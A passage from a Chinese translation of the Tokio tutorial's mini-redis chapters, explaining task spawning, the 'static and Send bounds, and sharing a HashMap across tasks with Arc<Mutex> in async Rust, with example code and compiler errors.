    let listener = TcpListener::bind(&quot;127.0.0.1:6379&quot;).await.unwrap();

    loop {
        // 解构出来的第二个 item 包含一个新 connection 的一对 IP 和 port，这里将其忽略了
        let (socket, _) = listener.accept().await.unwrap();
        process(socket).await;
    }
}

async fn process(socket: TcpStream) {
    // `Connection` 让我们能够读写 redis **frames**(抽象的帧) 而不是
    // byte streams(字节流). `Connection` 类型由 mini-redis 定义。
    let mut connection = Connection::new(socket);

    if let Some(frame) = connection.read_frame().await.unwrap() {
        println!(&quot;GOT: {:?}&quot;, frame);

        // Respond with an error
        let response = Frame::Error(&quot;unimplemented&quot;.to_string());
        connection.write_frame(&amp;response).await.unwrap();
    }
}
</code></pre></pre>
<p>现在把它跑起来：</p>
<pre><code class="language-zsh">cargo run
</code></pre>
<p>在另一个终端窗口，运行 <code>hello-redis</code> example（上一节我们写的那个 <code>SET / GET</code>）</p>
<pre><code class="language-zsh">cargo run --example hello-redis
</code></pre>
<p>输出应该得是像下面这样：</p>
<pre><code class="language-zsh">Error: &quot;unimplemented&quot;
</code></pre>
<p>在跑服务端的那个终端，输出应该是下面这样：</p>
<pre><code class="language-zsh">GOT: Array([Bulk(b&quot;set&quot;), Bulk(b&quot;hello&quot;), Bulk(b&quot;world&quot;)])
</code></pre>
<h2 id="concurrency-并发"><a class="header" href="#concurrency-并发">Concurrency （并发）</a></h2>
<p>我们的 server 有一个问题（除去只回复了错误）。它一次只会处理一个入站请求：当一个连接被接受，我们的 server 停留在 accept loop 里面，直到 <code>response</code> 被完全写入 socket。</p>
<p>我们肯定是希望我们的 Redis server 能够处理并发的请求，为了达到这个目的，我们需要加并发。</p>
<blockquote>
<p>并发(concurrency)和并行(parallelism)不是一回事。如果一个线程交替执行两个任务，那么就是同时(CPU 有能力让你感觉到是“同时”，尽管同一时间点一个线程只可能在处理一个任务)处理这两个任务(这是并发)，但不是并行处理。要让这变成并行，那么至少需要 2 个线程，每个线程都执行一个任务。</p>
<p>使用 <code>Tokio</code> 的优点之一是异步代码允许您同时处理许多任务，而不必使用普通线程并行处理它们。事实上，Tokio可以在单个线程上同时运行许多任务！</p>
</blockquote>
<p>为了并发处理这些连接，对每个入站连接都得生成一个新任务，连接会在这个新任务中被处理。</p>
<p>accept loop 会变成这样：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::net::TcpListener;

#[tokio::main]
async fn main() {
    // 绑定 listener 到一个地址
    let listener = TcpListener::bind(&quot;127.0.0.1:6379&quot;).await.unwrap();

    loop {
        // 解构出来的第二个 item 包含一个新 connection 的一对 IP 和 port，这里将其忽略了
        let (socket, _) = listener.accept().await.unwrap();
        // 生成一个新任务，socket 的所有权被移动到了这个新任务里面，并在那里被处理。
        tokio::spawn(async move {
            process(socket).await;
        });
    }
}
</code></pre></pre>
<h3 id="tasks"><a class="header" href="#tasks">Tasks</a></h3>
<p>一个 Tokio 任务是一个异步的 green thread。他们是通过 <code>async</code> 块传递给 <code>tokio::spawn</code>  来创建的。<code>tokio::spawn</code> 函数返回一个 <code>JoinHandle</code>，使得 <code>JoinHandle</code>  的调用者可以与生成的任务进行交互。<code>async</code> 块可以拥有返回值，调用者通过在 <code>JoinHandle</code> 上使用 <code>.await</code> 来获取返回值。</p>
<p>举个栗子：</p>
<pre><pre class="playground"><code class="language-rust">#[tokio::main]
async fn main() {
    let handle = tokio::spawn(async {
        // 在这里做了一些异步的事情
        &quot;return value&quot;
    });

    // 又做了一些别的事情

    let out = handle.await.unwrap();
    println!(&quot;GOT {}&quot;, out);
}
</code></pre></pre>
<p><code>.await</code> 会让出当前线程的控制权，并等待 <code>JoinHandle</code> 返回一个 <code>Result</code>。当一个任务在执行期间遇到了一个错误，<code>JoinHandle</code> 将会返回一个 <code>Err</code> ，当任务 panic 又或者是因为 <code>runtime</code> 关闭而被强制取消也会发生前面那个事件。</p>
<p>Task 是由 scheduler 管理的执行单位。Spawn (生产) 一个任务会把任务提交给 Tokio scheduler来确保任务在有工作要做时执行。生产出来的任务可能会在它们被生产的线程上执行，也有可能会在不一样的 <code>runtime thread</code> 上被执行。任务被生产后也能够在不同线程间移动。</p>
<p>任务在 Tokio 中是非常非常轻量的。在底层，它们只需要一次分配和64字节的内存。应用程序应该可以随意生成数千甚至数百万个任务。</p>
<h2 id="static-bound静态生命周期绑定"><a class="header" href="#static-bound静态生命周期绑定"><code>'static</code> bound（静态生命周期绑定）</a></h2>
<p>当我们在 Tokio runtime 上生成了一个任务，其类型的生命周期必须是 <code>'static</code>。这意味着生成的任务不得包含对任务外部拥有的数据的任何引用。</p>
<blockquote>
<p>一个常见的错觉是：<code>'static</code> 总是意味着 &quot;永远存活&quot;，但事实并非如此。仅仅因为一个值是静态的并不意味着你有内存泄漏。想知道更多可以看这里 <a href="https://github.com/pretzelhammer/rust-blog/blob/master/posts/common-rust-lifetime-misconceptions.md#2-if-t-static-then-t-must-be-valid-for-the-entire-program">Common Rust Lifetime Misconceptions</a> 。</p>
</blockquote>
<p>举个不能被编译通过的例子:D</p>
<pre><pre class="playground"><code class="language-rust">use tokio::task;

#[tokio::main]
async fn main() {
    let v = vec![1, 2, 3];

    task::spawn(async {
        println!(&quot;Here's a vec: {:?}&quot;, v);
    });
}
</code></pre></pre>
<p>尝试编译它会有如下报错：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>error[E0373]: async block may outlive the current function, but
              it borrows `v`, which is owned by the current function
 --&gt; src/main.rs:7:23
  |
7 |       task::spawn(async {
  |  _______________________^
8 | |         println!(&quot;Here's a vec: {:?}&quot;, v);
  | |                                        - `v` is borrowed here
9 | |     });
  | |_____^ may outlive borrowed value `v`
  |
note: function requires argument type to outlive `'static`
 --&gt; src/main.rs:7:17
  |
7 |       task::spawn(async {
  |  _________________^
8 | |         println!(&quot;Here's a vector: {:?}&quot;, v);
9 | |     });
  | |_____^
help: to force the async block to take ownership of `v` (and any other
      referenced variables), use the `move` keyword
  |
7 |     task::spawn(async move {
8 |         println!(&quot;Here's a vec: {:?}&quot;, v);
9 |     });
  |
<span class="boring">}
</span></code></pre></pre>
<p>这种情况会发生是因为默认情况下，变量不会被 <strong>move</strong> 到 async block。这个 <code>v</code>  Vector 被 <code>main</code> 函数保留了所有权。<code>println!</code> 只是借用了 <code>v</code>。rust 编译器向我们解释了这一点，甚至提出了修复建议！（rust 编译器还是一如既往的牛逼！尽管它的严格经常会让我很挫败:( ）</p>
<p>按 rust 编译器说的来，在第 7 行处为 async block 加上 <code>move</code> ，现在这个 task 就拥有了 v 的所有权而不是借用，并且让它变成了 <code>'static</code>。</p>
<p>如果必须同时从多个任务访问单个数据，那么就必须使用 <code>Arc</code> 等同步原语共享它。</p>
<p>下面引用的内容我觉得比较难理解：</p>
<blockquote>
<p>Note that the error message talks about the argument type <em>outliving</em> the <code>'static</code> lifetime. This terminology can be rather confusing because the <code>'static</code> lifetime lasts until the end of the program, so if it outlives it, don't you have a memory leak? The explanation is that it is the <em>type</em>, not the <em>value</em> that must outlive the <code>'static</code> lifetime, and the value may be destroyed before its type is no longer valid.</p>
<p>When we say that a value is <code>'static</code>, all that means is that it would not be incorrect to keep that value around forever. This is important because the compiler is unable to reason about how long a newly spawned task stays around. We have to make sure that the task is allowed to live forever, so that Tokio can make the task run as long as it needs to.</p>
<p>The article that the info-box earlier links to uses the terminology &quot;bounded by <code>'static</code>&quot; rather than &quot;its type outlives <code>'static</code>&quot; or &quot;the value is <code>'static</code>&quot; to refer to <code>T: 'static</code>. These all mean the same thing, but are different from &quot;annotated with <code>'static</code>&quot; as in <code>&amp;'static T</code>.</p>
</blockquote>
<p>留意关于<strong>参数类型</strong>的寿命超过了 <code>’static</code> 生命周期的错误信息。这个术语可能会让人很困惑，因为 <code>'static</code> 生命周期将会一直存在直到程序结束，所以如果比它寿命还长，确定没有内存泄漏吗？ 关于这个的解释是：它是一个类型，而不是一个必须寿命长过 <code>'static</code>' 的值，并且它的值可能会在它的类型失效之前被销毁。</p>
<p>当我们说一个值是 <code>'static</code> 的时候，这意味着永远留着它常常是正确的。这非常重要，因为编译器无法推断新生成的任务会保留多长时间。我们不得不确保任务被允许一直存活（仅仅是允许，但不是必须），这样 Tokio 就可以让任务运行它实际需要的时间。</p>
<p>前面的信息框链接到的文章使用术语 <strong>“以 <code>'static</code> 为界”</strong> 而不是 <strong>“其类型的寿命超过 <code>'static</code> ”</strong> 或 <strong>“其值是 <code>'static</code>&quot;</strong> 来指代 <code>T：'static</code>。这些都意味着同一件事，但不同于 <code>&amp;‘static T</code> 中的 <strong>“用 <code>'static</code> 注释”</strong></p>
<p>插一句嘴：上面这块儿我是琢磨了很久，但是还有一些内容没完全明白，看来还是有待提升呐～</p>
<h2 id="send-bound"><a class="header" href="#send-bound"><code>Send</code> bound</a></h2>
<p>从 <code>tokio::spawn</code> 生成的任务<strong>必须</strong>实现 <code>Send</code> trait 。这样才能当任务被 <code>.await</code> 后允许 Tokio runtime 在线程之间移动他们。</p>
<p>因为水平有限，可能有误，所以附上原文后再给出我的理解：</p>
<blockquote>
<p>Tasks are <code>Send</code> when <strong>all</strong> data that is held <strong>across</strong> <code>.await</code> calls is <code>Send</code>. This is a bit subtle. When <code>.await</code> is called, the task yields back to the scheduler. The next time the task is executed, it resumes from the point it last yielded. To make this work, all state that is used <strong>after</strong> <code>.await</code> must be saved by the task. If this state is <code>Send</code>, i.e. can be moved across threads, then the task itself can be moved across threads. Conversely, if the state is not <code>Send</code>, then neither is the task.</p>
</blockquote>
<p>当一个任务内所有跨过 <code>.await</code> 调用的数据都实现了 <code>Send</code> 时，这个任务才是实现了 <code>Send</code> 的。如下例子就会因为 <code>a</code> 没有实现 <code>Send</code> 且跨过了 <code>.await</code> 调用而导致编译失败：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::net::TcpListener;

#[tokio::main]
async fn main() {
    // 绑定 listener 到一个地址
    let listener = TcpListener::bind(&quot;127.0.0.1:6379&quot;).await.unwrap();

    loop {
        // 解构出来的第二个 item 包含一个新 connection 的一对 IP 和 port，这里将其忽略了
        let (socket, _) = listener.accept().await.unwrap();
        let a = Rc::new(&quot;Rc does not impl Send&quot;);
        // 生成一个新任务，socket 的所有权被移动到了这个新任务里面，并在那里被处理。
        tokio::spawn(async move {
            process(socket).await;
            println!(&quot;{:?}&quot;, a);
        });
    }
}
</code></pre></pre>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>error: future cannot be sent between threads safely
   --&gt; src/main.rs:16:9
    |
16  |         tokio::spawn(async move {
    |         ^^^^^^^^^^^^ future created by async block is not `Send`
    |
    = help: within `impl std::future::Future&lt;Output = ()&gt;`, the trait `std::marker::Send` is not implemented for `std::rc::Rc&lt;&amp;str&gt;`
note: captured value is not `Send`
   --&gt; src/main.rs:18:30
    |
18  |             println!(&quot;{:?}&quot;, a);
    |                              ^ has type `std::rc::Rc&lt;&amp;str&gt;` which is not `Send`
note: required by a bound in `tokio::spawn`
   --&gt; /home/m4n5ter/.cargo/registry/src/rsproxy.cn-8f6827c7555bfaf8/tokio-1.21.2/src/task/spawn.rs:127:21
    |
127 |         T: Future + Send + 'static,
    |                     ^^^^ required by this bound in `tokio::spawn`

error: could not compile `my-redis` due to previous error
<span class="boring">}
</span></code></pre></pre>
<p>因为用了 <code>.await</code> 后，当前任务会让出线程控制权，任务的当前状态会被整个打包，并且可能会在多个线程间传递这个任务，存在任务会在不同的线程被执行的可能，而数据在线程间传递要求实现 <code>Send</code> trait 。</p>
<p>下面是官方给出的两个例子：</p>
<p>成功：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::task::yield_now;
use std::rc::Rc;

#[tokio::main]
async fn main() {
    tokio::spawn(async {
        // The scope forces `rc` to drop before `.await`.
        {
            let rc = Rc::new(&quot;hello&quot;);
            println!(&quot;{}&quot;, rc);
        }

        // `rc` is no longer used. It is **not** persisted when
        // the task yields to the scheduler
        yield_now().await;
    });
}
</code></pre></pre>
<p>失败：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::task::yield_now;
use std::rc::Rc;

#[tokio::main]
async fn main() {
    tokio::spawn(async {
        let rc = Rc::new(&quot;hello&quot;);

        // `rc` is used after `.await`. It must be persisted to
        // the task's state.
        yield_now().await;

        println!(&quot;{}&quot;, rc);
    });
}
</code></pre></pre>
<p>错误报告：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>error: future cannot be sent between threads safely
   --&gt; src/main.rs:6:5
    |
6   |     tokio::spawn(async {
    |     ^^^^^^^^^^^^ future created by async block is not `Send`
    | 
   ::: [..]spawn.rs:127:21
    |
127 |         T: Future + Send + 'static,
    |                     ---- required by this bound in
    |                          `tokio::task::spawn::spawn`
    |
    = help: within `impl std::future::Future`, the trait
    |       `std::marker::Send` is not  implemented for
    |       `std::rc::Rc&lt;&amp;str&gt;`
note: future is not `Send` as this value is used across an await
   --&gt; src/main.rs:10:9
    |
7   |         let rc = Rc::new(&quot;hello&quot;);
    |             -- has type `std::rc::Rc&lt;&amp;str&gt;` which is not `Send`
...
10  |         yield_now().await;
    |         ^^^^^^^^^^^^^^^^^ await occurs here, with `rc` maybe
    |                           used later
11  |         println!(&quot;{}&quot;, rc);
12  |     });
    |     - `rc` is later dropped here
<span class="boring">}
</span></code></pre></pre>
<p>我们会在下一节 Shared state 来更深入的探讨这个错误的特殊情况。</p>
<h2 id="store-values存储值"><a class="header" href="#store-values存储值">Store values（存储值）</a></h2>
<p>我们现在将要实现 <code>process</code> 函数来处理发送过来的命令。我们使用 <code>HashMap</code> 来存储值。<code>SET</code> 命令将会插入数据到 <code>HashMap</code> ，<code>GET</code> 值会加载数据。另外，我们将会使用一个 loop 来接受每个连接的多个命令。</p>
<pre><pre class="playground"><code class="language-rust">use mini_redis::{Connection, Frame};
use tokio::net::{TcpListener, TcpStream};

#[tokio::main]
async fn main() {
    // 绑定 listener 到一个地址
    let listener = TcpListener::bind(&quot;127.0.0.1:6379&quot;).await.unwrap();

    loop {
        // 解构出来的第二个 item 包含一个新 connection 的一对 IP 和 port，这里将其忽略了
        let (socket, _) = listener.accept().await.unwrap();

        // 生成一个新任务，socket 的所有权被移动到了这个新任务里面，并在那里被处理。
        tokio::spawn(async move { process(socket).await });
    }
}

async fn process(socket: TcpStream) {
    use mini_redis::Command::{self, Get, Set};
    use std::collections::HashMap;

    // 一个 `HashMap` 用来存储数据
    let mut db = HashMap::new();

    // `Connection` 让我们能够读写 redis **frames**(抽象的帧) 而不是
    // byte streams(字节流). `Connection` 类型由 mini-redis 定义。
    let mut connection = Connection::new(socket);

    // 使用 `read_frame` 来从`connection`接收一个`Command`。
    while let Some(frame) = connection.read_frame().await.unwrap() {
        let response = match Command::from_frame(frame).unwrap() {
            Set(cmd) =&gt; {
                // 值被存储为 `Vec&lt;u8&gt;`
                db.insert(cmd.key().to_string(), cmd.value().to_vec());
                Frame::Simple(&quot;OK&quot;.to_string())
            }
            Get(cmd) =&gt; {
                if let Some(value) = db.get(cmd.key()) {
                    // `Frame::Bulk` 期望数据是`Bytes` 类型的。
                    // 这个类型将会在教程的后面部分讨论。
                    // 现在`&amp;Vec&lt;u8&gt;` 通过 `into()` 被转换成了 `Bytes` 。
                    Frame::Bulk(value.clone().into())
                } else {
                    Frame::Null
                }
            }
            cmd =&gt; panic!(&quot;unimplemented {:?}&quot;, cmd),
        };

        // Write the response to the client
        connection.write_frame(&amp;response).await.unwrap();
    }
}
</code></pre></pre>
<p>让我们来试一试：</p>
<pre><code class="language-zsh">cargo run
</code></pre>
<p>另一个终端窗口执行：</p>
<pre><code class="language-zsh">cargo run --example hello-redis
</code></pre>
<p>出现了如下输出：</p>
<pre><code class="language-zsh">从服务端得到了值; result=Some(b&quot;world&quot;)
</code></pre>
<p>我们现在可以获取和设置值，但是有一个问题：这些值在连接之间不共享。如果另一个套接字连接并尝试获取hello键，它将找不到任何东西。</p>
<p>在下一节中，我们将为所有套接字实现持久化数据。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="shared-state"><a class="header" href="#shared-state">Shared state</a></h2>
<p>到目前为止，我们有一个 key-value server 在工作。但是，存在一个重大缺陷：状态不会在连接之间共享。我们将在本文中修复它。</p>
<h2 id="strategies-方案"><a class="header" href="#strategies-方案">Strategies （方案）</a></h2>
<p>这里有两种不同的方式来在 Tokio 中分享状态。</p>
<ol>
<li>
<p>使用 <code>Mutex</code> 保护被分享的状态。</p>
</li>
<li>
<p>生成一个任务来管理状态并且使用<strong>消息传递</strong>来操作</p>
</li>
</ol>
<p>一般来说你想要为简单的数据采用第一种方法，第二种方法用来应对需要像 I/O 原语这样的异步工作。在本章，被分享的状态是一个 <code>HashMap</code> 并且操作为 <code>insert</code> 和 <code>get</code> 。这两种操作都不是异步的，因此我们可以使用 <code>Mutex</code> 。</p>
<p>下一章再来介绍后一种方法。</p>
<h2 id="add-bytes-dependency-添加-bytes-依赖"><a class="header" href="#add-bytes-dependency-添加-bytes-依赖">Add <code>bytes</code> dependency （添加 <code>bytes</code> 依赖）</a></h2>
<p>与使用 <code>Vec&lt;u8&gt;</code> 不同，Mini-Redis crate 使用了 <a href="https://docs.rs/bytes/1/bytes/struct.Bytes.html"><code>bytes</code></a> crate 中的 <code>Bytes</code> 。使用 <code>Bytes</code> 的目的是为网络编程提供一个健壮的字节数组结构体。<code>Bytes</code> 比 <code>Vec&lt;u8&gt;</code> 多的一个最大的特点是它实现了浅拷贝。换句话说，在 <code>Bytes</code> 实例上调用 <code>clone()</code> 不会拷贝底层的数据。相反，一个 <code>Bytes</code> 实例是一个底层数据的 rc（引用计数器）句柄。<code>Bytes</code> 类型与 <code>Arc&lt;Vec&lt;u8&gt;&gt;</code> 相似，但是多了些附加的功能。</p>
<p>为了引入 <code>bytes</code> 依赖，把下方的内容添加到你的 <code>Cargo.toml</code> 中的 <code>[dependencies]</code> 部分：</p>
<pre><code class="language-toml">bytes = &quot;1&quot;
</code></pre>
<h2 id="initialize-the-hashmap-初始化-hashmap"><a class="header" href="#initialize-the-hashmap-初始化-hashmap">Initialize the <code>HashMap</code> （初始化 <code>HashMap</code>）</a></h2>
<p><code>HashMap</code> 将会被跨多任务（并且可能会是多个线程）共享。为了能够做到这点，它将会被 <code>Arc&lt;Mutex&lt;_&gt;&gt;</code> 包裹。</p>
<p>首先，方便起见，在 <code>use</code> 语句后加上下面的类型别名：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use bytes::Bytes;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};

type Db = Arc&lt;Mutex&lt;HashMap&lt;String, Bytes&gt;&gt;&gt;;
<span class="boring">}
</span></code></pre></pre>
<p>然后，改变 <code>main</code> 函数来初始化 <code>HashMap</code> 并且传递一个 <code>Arc</code> 句柄参数给 <code>process</code> 函数。使用 <code>Arc</code> 能够允许 <code>HashMap</code> 被多个任务并发地引用以及在多线程中运行。在整个 Tokio 中，这样的 <code>Arc</code> 句柄常见于用来引用一个提供了对某些共享状态的访问的值。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::net::TcpListener;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};

#[tokio::main]
async fn main() {
    let listener = TcpListener::bind(&quot;127.0.0.1:6379&quot;).await.unwrap();

    println!(&quot;Listening&quot;);

    let db = Arc::new(Mutex::new(HashMap::new()));

    loop {
        let (socket, _) = listener.accept().await.unwrap();
        // Clone the handle to the hash map.
        let db = db.clone();

        println!(&quot;Accepted&quot;);
        tokio::spawn(async move {
            process(socket, db).await;
        });
    }
}
</code></pre></pre>
<h3 id="使用-stdsyncmutex"><a class="header" href="#使用-stdsyncmutex">使用 <code>std::sync::Mutex</code></a></h3>
<p>请注意，用的是 <code>std::sync::Mutex</code> 来保护 <code>HashMap</code> 而不是 <code>tokio::sync:Mutex</code> 。一个常见的错误是无条件的在异步代码中使用 <code>tokio::sync::Mutex</code> 。异步锁是用来锁定跨 <code>.await</code> 调用的互斥锁。</p>
<p>一个同步的互斥锁在等待获取锁的时候会阻塞当前线程。所以反过来说，它会阻塞所在线程对其它任务的处理。但是，切换到 <code>tokio::sync::Mutex</code> 通常不能够有什么帮助，因为异步锁在内部也使用了同步锁。</p>
<p>有这样一个经验法则，只要锁竞争保持在一个较低的水准并且锁没有跨 <code>.await</code> 持有，那么在异步代码中使用同步锁也很好。另外，可以考虑使用 <a href="https://docs.rs/parking_lot/0.10.2/parking_lot/type.Mutex.html"><code>parking_log::Mutex</code></a> 作为替代，它是比 <code>std::sync::Mutex</code> 更快的实现。</p>
<h2 id="update-process-更新-process"><a class="header" href="#update-process-更新-process">Update <code>process()</code> （更新 <code>process()</code>）</a></h2>
<p>这个函数不再初始化 <code>HashMap</code> 。相反，它接收一个共享的 <code>HashMap</code> 作为参数。它同样需要在使用前 lock 这个 <code>HashMap</code> 。请记住，HashMap 的值的类型现在是 <code>Bytes</code> （clone 它的代价非常低）了，所以也需要修改。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::net::TcpStream;
use mini_redis::{Connection, Frame};

async fn process(socket: TcpStream, db: Db) {
    use mini_redis::Command::{self, Get, Set};

    // Connection, provided by `mini-redis`, handles parsing frames from
    // the socket
    let mut connection = Connection::new(socket);

    while let Some(frame) = connection.read_frame().await.unwrap() {
        let response = match Command::from_frame(frame).unwrap() {
            Set(cmd) =&gt; {
                let mut db = db.lock().unwrap();
                db.insert(cmd.key().to_string(), cmd.value().clone());
                Frame::Simple(&quot;OK&quot;.to_string())
            }           
            Get(cmd) =&gt; {
                let db = db.lock().unwrap();
                if let Some(value) = db.get(cmd.key()) {
                    Frame::Bulk(value.clone())
                } else {
                    Frame::Null
                }
            }
            cmd =&gt; panic!(&quot;unimplemented {:?}&quot;, cmd),
        };

        // Write the response to the client
        connection.write_frame(&amp;response).await.unwrap();
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="tasks-threads-and-contention-任务线程竞争"><a class="header" href="#tasks-threads-and-contention-任务线程竞争">Tasks, threads, and contention （任务、线程、竞争）</a></h3>
<p>当锁竞争很小的时候，使用一个阻塞的锁来保护<code>短临界区</code> 是一种可接受的策略。当一个锁在被竞争，执行本任务的线程必须阻塞并且等待这个锁。这不仅仅会阻塞当前的任务，还会阻塞其他被调度到当前线程上的任务。</p>
<p>默认情况下，Tokio runtime 使用一个多线程调度器。任务被调度到被 runtime 管理的任意数量的线程上。如果计划执行大量任务，并且它们都需要访问互斥锁，那么就会出现竞争。另一方面，如果 <a href="https://docs.rs/tokio/1.21.2/tokio/runtime/index.html#current-thread-scheduler"><code>current_thread</code></a> runtime 风格被启用，那么互斥锁将永远不会被竞争。</p>
<blockquote>
<p> <a href="https://docs.rs/tokio/1/tokio/runtime/struct.Builder.html#method.new_current_thread"><code>current_thread</code> runtime flavor</a> 是一个轻量、单线程的运行时。当只生成少量任务和打开不多的 sockets 时它是一个不错的选择。举个例子，当在异步客户端库之上桥接一个同步 API 时，这种选择效果很好（比如用new 一个 current_thread runtime，然后在它之上用 block_on 执行异步代码）。</p>
</blockquote>
<p>如果在同步锁上的竞争成为了一个问题，最好的解决方案是少量切换成 Tokio mutex。如果不采用前者方案，要考虑的选项有：</p>
<ul>
<li>
<p>跑一个专门用来管理状态的任务，并且使用消息传递来共享状态。</p>
</li>
<li>
<p>分片锁。</p>
</li>
<li>
<p>重构代码来避开锁。</p>
</li>
</ul>
<p>在我们目前的情况下，因为每个 key 都是独立的，所以分片锁的效果会很棒！为了做到这个，不能够只有一个单独的 <code>Mutex&lt;HashMap&lt;_,_&gt;&gt;</code> 实例，我们需要引入 <code>N</code> 个不同的实例：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>type ShardedDb = Arc&lt;Vec&lt;Mutex&lt;HashMap&lt;String, Vec&lt;u8&gt;&gt;&gt;&gt;&gt;;

fn new_sharded_db(num_shards: usize) -&gt; ShardedDb {
    let mut db = Vec::with_capacity(num_shards);
    for _ in 0..num_shards {
        db.push(Mutex::new(HashMap::new()));
    }
    Arc::new(db)
}
<span class="boring">}
</span></code></pre></pre>
<p>接着，找到给定 key 的的位置变成了两步过程。第一步，用 key 来确定在哪一个hash map 分片。第二步在 <code>HashMap</code> 中找 key：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let shard = db[hash(key) % db.len()].lock().unwrap();
shard.insert(key, value);
<span class="boring">}
</span></code></pre></pre>
<p>上面概述的简单实现需要使用固定数量的分片，并且一旦创建了 <code>SharedDb</code> 后分片的数量就不能改变了。<a href="https://docs.rs/dashmap">dashmap</a> crate 提供了一个更有经验验证的分片 hash map 实现。</p>
<h2 id="holding-a-mutexguard-across-an-await-跨-await-持有一个-mutexguard"><a class="header" href="#holding-a-mutexguard-across-an-await-跨-await-持有一个-mutexguard">Holding a <code>MutexGuard</code> across an <code>.await</code> （跨 <code>.await</code> 持有一个 <code>MutexGuard</code>）</a></h2>
<p>你可能会写出像下面这样的代码：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::sync::{Mutex, MutexGuard};

async fn increment_and_do_stuff(mutex: &amp;Mutex&lt;i32&gt;) {
    let mut lock: MutexGuard&lt;i32&gt; = mutex.lock().unwrap();
    *lock += 1;

    do_something_async().await;
} // 锁在这里超出作用域
<span class="boring">}
</span></code></pre></pre>
<p>当你尝试 spawn 一些东西来调用这个函数，你会遇到下面的错误信息：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>error: future cannot be sent between threads safely
   --&gt; src/lib.rs:13:5
    |
13  |     tokio::spawn(async move {
    |     ^^^^^^^^^^^^ future created by async block is not `Send`
    |
   ::: /playground/.cargo/registry/src/github.com-1ecc6299db9ec823/tokio-0.2.21/src/task/spawn.rs:127:21
    |
127 |         T: Future + Send + 'static,
    |                     ---- required by this bound in `tokio::task::spawn::spawn`
    |
    = help: within `impl std::future::Future`, the trait `std::marker::Send` is not implemented for `std::sync::MutexGuard&lt;'_, i32&gt;`
note: future is not `Send` as this value is used across an await
   --&gt; src/lib.rs:7:5
    |
4   |     let mut lock: MutexGuard&lt;i32&gt; = mutex.lock().unwrap();
    |         -------- has type `std::sync::MutexGuard&lt;'_, i32&gt;` which is not `Send`
...
7   |     do_something_async().await;
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^ await occurs here, with `mut lock` maybe used later
8   | }
    | - `mut lock` is later dropped here
<span class="boring">}
</span></code></pre></pre>
<p>这个错误会发生是因为 <code>std::sync::MutexGuard</code> 类型没有实现 <code>Send</code> trait 。这意味着你不能传递一个同步锁到另一个线程，另一个原因是 Tokio runtime 在每个 <code>.await</code> 调用时能够在线程间 move 一个任务。为了避免这个错误，你应该重构你的代码来让互斥锁的析构函数在 <code>.await</code> 之前就运行完毕。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 这样就行了！
async fn increment_and_do_stuff(mutex: &amp;Mutex&lt;i32&gt;) {
    {
        let mut lock: MutexGuard&lt;i32&gt; = mutex.lock().unwrap();
        *lock += 1;
    } // 锁在这里超出作用域

    do_something_async().await;
}
<span class="boring">}
</span></code></pre></pre>
<p>值得注意的是，下面这样不能正常运作：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::sync::{Mutex, MutexGuard};

// This fails too.
async fn increment_and_do_stuff(mutex: &amp;Mutex&lt;i32&gt;) {
    let mut lock: MutexGuard&lt;i32&gt; = mutex.lock().unwrap();
    *lock += 1;
    drop(lock);

    do_something_async().await;
}
<span class="boring">}
</span></code></pre></pre>
<p>这是因为编译器目前只是通过作用域信息来计算一个 future 是不是实现了 <code>Send</code> trait 。编译器未来有望被更新来支持显式的 drop，但是现在咱只能显式的加上作用范围。</p>
<p>注意，这里讨论的错误在上一节的 <a href="https://m4n5ter.github.io/rust/mini-redis/spawning.html#send-bound">Send Bound - Spawning</a> 也讨论过。</p>
<p>你不应该尝试通过某种方式生成一个不需要实现 <code>Send</code> 的任务来规避这个问题，因为如果任务正持有锁，而 Tokio 在 <code>.await</code> 处暂停了你的任务，一些其它的任务可能会被调度到同样的线程上，并且其他任务也可能尝试获取锁，这会导致死锁，因为等待锁的任务会阻塞当前线程，这也就阻止了持有锁的任务释放锁。</p>
<p>我们下面将要讨论一些解决这个错误信息的方法：</p>
<h3 id="restructure-your-code-to-not-hold-the-lock-across-an-await-重构你的代码来让锁不再跨-await-持有"><a class="header" href="#restructure-your-code-to-not-hold-the-lock-across-an-await-重构你的代码来让锁不再跨-await-持有">Restructure your code to not hold the lock across an <code>.await</code> （重构你的代码来让锁不再跨 <code>.await</code> 持有）</a></h3>
<p>我们已经在上面的片段中看到了一个例子，但是还有一些更鲁棒的解决方式。举个例子，你可以把互斥锁包装在一个结构体内，并且只将互斥锁锁定在该结构体上的非异步方法中。细节如下：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::sync::Mutex;

struct CanIncrement {
    mutex: Mutex&lt;i32&gt;,
}
impl CanIncrement {
    // This function is not marked async.
    fn increment(&amp;self) {
        let mut lock = self.mutex.lock().unwrap();
        *lock += 1;
    }
}

async fn increment_and_do_stuff(can_incr: &amp;CanIncrement) {
    can_incr.increment();
    do_something_async().await;
}
<span class="boring">}
</span></code></pre></pre>
